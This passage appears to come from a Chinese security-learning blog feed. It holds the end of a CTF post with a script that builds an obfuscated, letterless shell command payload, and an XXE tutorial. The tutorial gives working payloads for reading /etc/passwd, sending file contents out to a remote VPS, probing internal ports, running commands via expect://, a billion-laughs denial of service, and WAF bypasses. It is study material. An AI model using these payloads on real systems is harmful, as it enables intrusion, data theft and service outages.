class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>自增脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><blockquote><p><strong>自增需要抓包后url编码传参</strong></p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/news/11688?u_atoken=9341340a53a29d070e698cac517ace72&u_asig=1a0c381017412736154966901e00f3">利用shell脚本变量构造无字母数字命令</a></p><p><a href="https://www.freebuf.com/articles/system/361101.html">【bashfuck】bashshell无字母命令执行原理</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习</title>
      <link href="/archives/54771cc7/"/>
      <url>/archives/54771cc7/</url>
      
        <content type="html"><![CDATA[<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XXE是基于XML的攻击，所以在学习XXE前需了解什么是XML。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>XML（Extensible Markup Language）</strong>：与HTML类似，是一种标记语言，但与HTML不同的是，<strong>XML 被设计用来传输和存储数据，而HTML 被设计用来显示数据。</strong>XML 仅仅是纯文本，更重要的是，<strong>通过 XML 可以发明自己的标签，因为 XML 没有预定义的标签</strong>。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li><p><strong>把数据从 HTML 分离</strong></p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p></li><li><p><strong>简化数据共享</strong></p><p>XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。</p><p>这让创建不同应用程序可以共享的数据变得更加容易。</p></li><li><p><strong>简化数据传输</strong></p><p>通过XML，可以在不兼容的系统之间轻松的交换数据。</p></li><li><p><strong>简化平台的变更</strong></p><p>升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。</p><p>XML 数据以文本格式存储。这使得 XML 在不损失数据的情况下，更容易扩展或升级到新的操作系统、新应用程序或新的浏览器。</p></li><li><p><strong>用于创建新的 Internet 语言</strong></p><p>很多新的 Internet 语言是通过 XML 创建的：</p><p>其中的例子包括：</p><ul><li>XHTML - 最新的 HTML 版本</li><li>WSDL - 用于描述可用的 web service</li><li>WAP 和 WML - 用于手持设备的标记语言</li><li>RSS - 用于 RSS feed 的语言</li><li>RDF 和 OWL - 用于描述资源和本体</li><li>SMIL - 用于描述针针对 web 的多媒体</li></ul></li></ul><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span>  //声明版本及编码</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>          //描述文档的根元素（像在说：“本文档是一个便签”）</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span>   //四个子元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>该 XML 文档包含了 John 给 George 的一张便签。</strong></p></blockquote><p>例：</p><p><img src="/archives/54771cc7/ct_nodetree1.gif" alt="img"></p><p>上图表示下面的 XML 中的一本书：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span>             //根元素</span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;CHILDREN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p><strong>XML 元素必须遵循以下命名规则：</strong></p><ul><li><strong>名称可以含字母、数字以及其他的字符</strong></li><li><strong>名称不能以数字或者标点符号开始</strong></li><li><strong>名称不能以字符 “xml”（或者 XML、Xml）开始</strong></li><li><strong>名称不能包含空格</strong></li></ul><p><strong>可使用任何名称，没有保留的字词。</strong></p><p><strong>属性需要加引号</strong></p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>在XML中，一些字符拥有特殊意义，直接放入XML元素中，会发生错误，因为解析器会把它当作新元素的开始。所以需要用实体代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 XML 中，有 5 个预定义的实体引用</span><br><span class="line">&amp;lt;    &lt;    小于</span><br><span class="line">&amp;gt;    &gt;    大于</span><br><span class="line">&amp;amp;    &amp;    &amp;符</span><br><span class="line">&amp;apos;    &#x27;    单引</span><br><span class="line">&amp;quot;    &quot;    双引</span><br></pre></td></tr></table></figure><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD（document type definition）的东西控制的：</p><p><strong>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 DTD文件。</strong></p><p>内部TDT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; //声明xml版本</span><br><span class="line">&lt;!DOCTYPE note [   //声明此文档是note类型的文档</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  //声明此文档的所有元素</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;  //定义to元素的类型为PCDATA，PCDATA表示可包含任意字符串</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;  // 定义from元素类型为PCDATA</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt; // 定义heading为PCDATA</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;  // 定义body为PCDATA</span><br><span class="line">&lt;!ENTITY writer &quot;hello world&quot;&gt; // 定义一个内部实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><strong>外部TDT：</strong></p><ul><li><p><strong>通用实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt; #定义元素为ANY，即可以接受任何元素。</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt; // 定义通用实体</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;body&gt;&amp;xxe;&lt;/body&gt; #定义一个外部实体</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>&amp;xxe</code>用于引用，即引用后面的<code>SYSTEM &quot;file:///c:/test.dtd&quot;</code>,而<code>SYSTEM</code>引用外部资源，文件并执行。</p></blockquote><blockquote><p>除了 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><strong>参数实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element; %remote-dtd;  //引用an-element，remote-dtd两个参数</span><br></pre></td></tr></table></figure><blockquote><p>% 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 %实体名。同时。参数实体同样可引用外部实体。</p></blockquote></li></ul><h2 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h2><p><img src="/archives/54771cc7/QQ2025lan.png"></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>XXE（XML External Entity）是指xml外部实体攻击漏洞。XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。当包含对外部实体的引用的XML输入被弱配置XML解析器处理时，就会发生这种攻击。这种攻击通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>由于 SYSTEM 标识符引用的实体能够访问本地或远程的内容的特性，攻击者可通过控制其内容获取本地或远程文件内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM file:///etc/passwd</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p><strong>判断漏洞是否存在最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</strong></p><p>常见<strong>可能会产生xxe漏洞的文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">index.php</span><br><span class="line">SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="file-get-contents函数"><a href="#file-get-contents函数" class="headerlink" title="file_get_contents函数"></a><strong>file_get_contents函数</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$creds</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>.<span class="variable">$username</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>file_get_contents函数读取了php:&#x2F;&#x2F;input传入的数据,但是传入的数据没有经过任何过滤,直接在loadXML函数中进行了调用并通过了echo函数输入$username的结果，这样就导致了XXE漏洞的产生。</strong></p></blockquote><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><p><strong>通过加载外部实体，利用file:&#x2F;&#x2F;、php:&#x2F;&#x2F;等伪协议读取本地文件</strong></p><p><strong>SVG格式</strong>（一种基于XML的图像文件格式，用于创建二维矢量图形）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><strong>有回显：</strong></p><p><strong>用于读取php文件、文档</strong>。</p><ul><li><p><strong>直接外部实体声明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;file:///etc/passwd&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">  &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml versinotallow=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE ANY [</span><br><span class="line">                &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">        &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>引入外部DTD文档</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml versinotallow=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;</span><br><span class="line">        &lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br><span class="line"> </span><br><span class="line">evil.dtd内容：</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">//当然也可用参数实体</span><br></pre></td></tr></table></figure></li></ul><p><strong>无回显</strong>：</p><p><strong>利用参数实体：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>原理：连续调用了三个参数实体 %remote;%int;%send;，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p></blockquote><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a><strong>内网探测</strong></h4><p><strong>利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢</strong></p><p>探测22号端口是否开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;http://127.0.0.1.22&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><p><strong>利用xxe漏洞可以调用except:&#x2F;&#x2F;伪协议调用系统命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;expect://id&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h4 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a><strong>DDOS攻击</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</strong></p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="文档中的额外空格"><a href="#文档中的额外空格" class="headerlink" title="文档中的额外空格"></a><strong>文档中的额外空格</strong></h4><p>由于XXE通常在XML文档的开头，所以一些WAF为了避免处理整个文档，而<strong>只解析它的开头</strong>。但是，XML格式允许在格式化标记</p><p>属性时使用任意数量的空格，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格，从而绕过此类WAF。</p><p><img src="/archives/54771cc7/3549773-20241104201102341-1259290345.png"></p><h4 id="过滤SYSTEM-PUBLIC关键字"><a href="#过滤SYSTEM-PUBLIC关键字" class="headerlink" title="过滤SYSTEM,PUBLIC关键字"></a>过滤SYSTEM,PUBLIC关键字</h4><h5 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a><strong>字符编码绕过</strong></h5><p>一个xml文档不仅可以用UTF-8编码，也可以用<strong>UTF-16(两个变体 - BE和LE)<strong>、</strong>UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码</strong>。</p><p>而通过这些编码可以很容易地绕过WAF，因为通常正则表达式仅配置为但字符集。</p><p><strong>UTF-16BE编码绕过关键字</strong>：</p><p>构造poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 